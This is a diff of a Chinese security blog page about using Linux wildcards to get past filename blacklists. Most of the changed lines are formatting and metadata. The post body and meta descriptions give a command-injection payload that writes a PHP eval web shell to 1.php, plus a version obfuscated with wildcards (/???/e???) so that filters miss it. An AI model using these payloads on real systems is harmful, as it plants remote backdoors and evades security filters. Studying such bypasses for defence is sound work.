@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="文章来源:    http://www.sohu.com/a/235200861_658302 #通配符绕过黑名单,做免杀还是蛮有意思的,先做记录  1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php2.变形后的payload： cmd=/???/e??? &amp;quo">
+<meta name="description" content="文章来源:    http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php  2.变形后的payload：  cmd=/???/e??? &amp;qu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux通配符绕过文件名黑名单">
 <meta property="og:url" content="http://MaiKeFee.com/archives/18ca0ec6.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="文章来源:    http://www.sohu.com/a/235200861_658302 #通配符绕过黑名单,做免杀还是蛮有意思的,先做记录  1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php2.变形后的payload： cmd=/???/e??? &amp;quo">
+<meta property="og:description" content="文章来源:    http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php  2.变形后的payload：  cmd=/???/e??? &amp;qu">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-27T14:42:06.136Z">
+<meta property="og:updated_time" content="2019-08-28T08:52:46.109Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux通配符绕过文件名黑名单">
-<meta name="twitter:description" content="文章来源:    http://www.sohu.com/a/235200861_658302 #通配符绕过黑名单,做免杀还是蛮有意思的,先做记录  1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php2.变形后的payload： cmd=/???/e??? &amp;quo">
+<meta name="twitter:description" content="文章来源:    http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload  cmd=/bin/echo &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;])?&amp;gt;&amp;quot; &amp;gt; 1.php  2.变形后的payload：  cmd=/???/e??? &amp;qu">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T22:42:06+08:00">
-                2019-08-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:52:46+08:00">
+                2019-08-28
               </time>
             
           </span>
@@ -402,7 +402,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  73
+                  74
                 </span>
               
 
@@ -440,11 +440,13 @@
 
       
         <p>文章来源:<br>    <code>http://www.sohu.com/a/235200861_658302</code></p>
-<p>#通配符绕过黑名单,做免杀还是蛮有意思的,先做记录</p>
-<blockquote>
+<h1 id="通配符绕过黑名单-做免杀还是蛮有意思的-先做记录"><a href="#通配符绕过黑名单-做免杀还是蛮有意思的-先做记录" class="headerlink" title="通配符绕过黑名单,做免杀还是蛮有意思的,先做记录"></a>通配符绕过黑名单,做免杀还是蛮有意思的,先做记录</h1><blockquote>
 <p>1.原本的payload</p>
 </blockquote>
-<p><code>cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php</code><br>2.变形后的payload：</p>
+<p><code>cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php</code></p>
+<blockquote>
+<p>2.变形后的payload：</p>
+</blockquote>
 <p><code>cmd=/???/e??? &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php</code></p>
 
       
@@ -537,8 +539,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -607,6 +618,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#通配符绕过黑名单-做免杀还是蛮有意思的-先做记录"><span class="nav-number">1.</span> <span class="nav-text">通配符绕过黑名单,做免杀还是蛮有意思的,先做记录</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
